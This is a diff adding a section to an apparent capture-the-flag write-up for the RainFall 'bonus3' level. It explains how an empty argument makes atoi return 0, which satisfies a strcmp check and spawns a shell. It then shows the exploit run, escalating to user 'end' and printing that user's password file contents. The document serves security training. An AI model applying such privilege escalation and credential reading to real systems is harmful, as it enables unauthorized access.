@@ -48,6 +48,29 @@ size_t fread( *ptr, size_t size, size_t nitems, FILE *stream);
 
 ```
 
+```
+*(&var_98 + atoi(argv[1])) = 0      // buffer[atoi(av[1])] = 0
+
+ if (strcmp(&var_98, argv[1]) == 0) // strcmp(buffer, av[1])
+     execl("/bin/sh", "sh", 0);
+
+
+we don't know the value of the flag,
+we know that atoi("") = 0 <===> buffer[atoi("")] = 0 
+so strcmp(buffer, av[1]) will be considered equal
+```
+
+```
+bonus3@RainFall:~$ ./bonus3 ""
+$ pwd
+/home/user/bonus3
+$ whoami
+end
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
+```
+
+
 
 
 
